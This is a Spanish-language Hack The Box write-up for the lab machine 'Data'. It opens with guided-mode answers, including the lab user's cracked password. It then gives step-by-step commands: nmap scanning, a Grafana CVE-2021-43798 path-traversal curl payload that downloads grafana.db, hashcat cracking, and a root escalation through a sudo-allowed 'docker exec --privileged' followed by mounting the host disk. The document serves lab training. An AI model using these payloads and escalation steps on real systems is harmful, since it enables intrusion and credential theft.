---
title: Writeup data - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - data
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina data en Hack The Box.
keywords:
  - writeup data
  - hack the box data
  - resolución máquina data
  - data hack the box
  - htb data
---
---
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Data)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=_AsYsuZkGXA)
- 🧠 **Explicación resumida**: 

----

#easy #linux #ping #nmap #CVE-2021-43798 #hashcat #mount #/etc/hosts #sudo-l #ssh #curl #sqlite3 #docker #tratamientotty #grafana #wappalyzer #whatweb #abusobinariodocker #docker #dockerexec

------
# Guided Mode

1)¿Cuántos puertos TCP abiertos están a la escucha en Data?
	2

2)¿Qué aplicación está escuchando en el servidor HTTP?
	Grafana

3)¿Qué versión de Grafana se está ejecutando en Data? Indíquelo en el formato ``**.*.*.``
	v8.0.0

4)¿Cuál es el ID CVE de una vulnerabilidad de 2021 en esta versión de Grafana que describe una vulnerabilidad de recorrido de directorios que permite a los atacantes leer archivos arbitrarios del servidor web?
	CVE-2021-43798

5)¿Cuál es la ruta absoluta completa del archivo de la base de datos de Grafana en Data?
	/var/lib/grafana/grafana.db

6)Además del administrador, ¿qué otro usuario tiene una cuenta en la instancia de Grafana?
	boris

7)¿Cuál es la contraseña del usuario boris en Data?
	beautiful1

*La pregunta anterior es la flag de user.txt*
9)¿Cuál es la ruta completa del binario que el usuario boris puede ejecutar como root sin introducir una contraseña en Data utilizando sudo?
	/snap/bin/docker

10)¿Cuál es la ruta completa del dispositivo que está montado como / en el sistema de archivos del host?
	/dev/sda1

11)¿Cuál es la opción en docker exec que ejecuta el comando con privilegios ampliados?
	--privileged

----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.234.47
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.234.47 -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -p22,3000 10.129.234.47 -oN targetTCP
nmap -sU --top-ports 200 -n -Pn -oG allPortsUDP
extractPorts allPortsUDP
nmap -sU -sCV -p68,2148,49187,58002,65024 10.129.234.47 -oN targetUDP
```

![[Data2.png]]

![[Data1.png]]
![[Data4.png]]
![[Data5.png]]
![[Data6.png]]

![[Data8.png]]
![[Data11.png]]

*TTL:* Maquina Linux
*Puertos TCP:*
	`22` [[ssh]]
	`3000` ppp
		El escaneo tambien nos da informacion de que puede ser un HTTP
*Puertos UDP:*
	Nada importante


--------
# [[Whatweb-wappalyzer]]

```
whatweb http://10.129.234.47:3000/login
```

![[Data10.png]]

![[Data9.png]]
No nos da nada relevante 

---------------
# [[CVE-2021-43798]]

Entramos a http://10.129.234.47:3000 y tenemos este login panel de grafana y nos muestra que tiene la version v8.0.0
![[Data3.png]]

Vamos a usar [[searchsploit]] con el comando `searchsploit grafana` y vemos que tiene una vulnerabilidad para la version 8.3.0 como tenemos una version anterior a esa suponemos que puede estar la vulnerabilidad activa asi que vamos a descargar el exploit con `searchsploit -m multiple/webapps/50581.py`


![[Data7.png]]

Como indica el titulo del exploit, sirve para realizar un LFI, asi que vamos a buscar en google la ubicaicon de la base datos de grafana y nos da la siguiente ubicacion `/var/lib/grafana/grafana.db`


![[Data17.png]]
Ahora vamos a ejecutar el exploit `python3 50581.py -H http://10.129.234.47:3000` y vamos a leer el archivo `/var/lib/grafana/grafana.db`

![[Data16.png]]

![[Data15.png]]
Vimos como funcionaba el script y lo hicimos de forma manual para descargar el archivo.db ya que cuando lo leiamos la base de datos daba mucho texto y no se entendia bien

Con [[curl]] vamos a descargar la base de datos `curl 'http://10.129.234.47:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' --path-as-is --output grafana.db` y lo vamos a exportar en un archivo llamado grafana.db
![[Data18.png]]



## Abrir archivo de base de datos con [[sqlite3]]

Usamos el comando `sqlite3 grafana.db` para abrir el archivo de la base de datos
```
.tables                  /Para las tablas
select * from user;      /Para mostrar todo el contenido de la columna user
```

![[Data19.png]]
nos da esto `dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w`
Y un dato importante es que boris se esta conectando por el dominio *data.vl*



## Crackear el hash con [[Hashcat]]

Con [[git clone]] vamos a descargar el repositorio `git clone https://github.com/iamaldi/grafana2hashcat` ya que el grafana no guarda los hashes en una forma estandar

vamos a crear un archivo y poner el hash de la siguiente forma
![[Data20.png]]

```
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```

Ejecutamos el exploit pasandole el archivo que creamos anteriormente `python3 grafana2hashcat.py hash`
![[Data21.png]]
 Nos da este resultado ``sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=``

Ahora con [[Hashcat]] vamos a crackearlo con el siguiente comando `hashcat -m 10900 crack --wordlist /usr/share/wordlists/rockyou.txt `

![[Data22.png]]
nos dice que la contraseña es  y el usuario es boris
Y nos da la contraseña *beautiful1* del usuario boris
boris:beautiful1

---
# Conexion por [[ssh]] y agregamos dominio a /etc/hosts


Intentamos conexion por [[ssh]] y nos da este error

![[Data25.png]]

Pero si agregamos el dominio de data.vl al /etc/hosts con [[nvim]] usamos con algun usuario con privilegios el comando `nvim /etc/hosts` y agregamos lo siguiente

![[Data23.png]]

```
10.129.234.47 data.vl
```

![[Data24.png]]

Ahora con las credenciales que teneamos antes *boris:beautiful1* vamos a conectarnos con [[ssh]] usando `ssh boris@data.vl -p 22` 

![[Data26.png]]
Ya estamos adentro de la maquina

---
# [[Tratamiento de la TTY]]

----
# Escalada de privilegios con [[Abuso de Sudo]] [[Binario docker]]

```shell
sudo -l
```


![[Data27.png]]
Nos indica que podemos ejecutar como root sin proporcionar contraseña el binario `/snap/bin/docker exec *`


Si uso  [[ps faux y ps -eo]] con el comando `ps -faux | grep docker` vemos que esta corriendo el docker e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81

![[Data28.png]]

Asi que nos vamos a meter al contenedor como si fueramos el usuario root con `sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash`


![[Data29.png]]
Si usamos [[mount]] vemos que la priemra partición del disco /dev/sda1 esta sirviendo como sistema de archivos real para ficheros dentro del contenedor
![[Data35.png]]

Asi que vamos a usar el comando ``mount /dev/sda1 /mnt/`` para montar todos los archivos de la maquina host del directorio /dev/sda1 a la carpeta /mnt del contenedor
Y listo ya podemos catear las flags

![[Data30.png]]

--------
# Notas

PPP (Protocolo Punto a Punto) es un protocolo de enlace de datos que crea conexiones directas y seguras entre dos puntos

-----------
# Creditos

Writeup Oficial HackTheBox
[Writeup de 0xdf](https://0xdf.gitlab.io/2025/07/01/htb-data.html#)


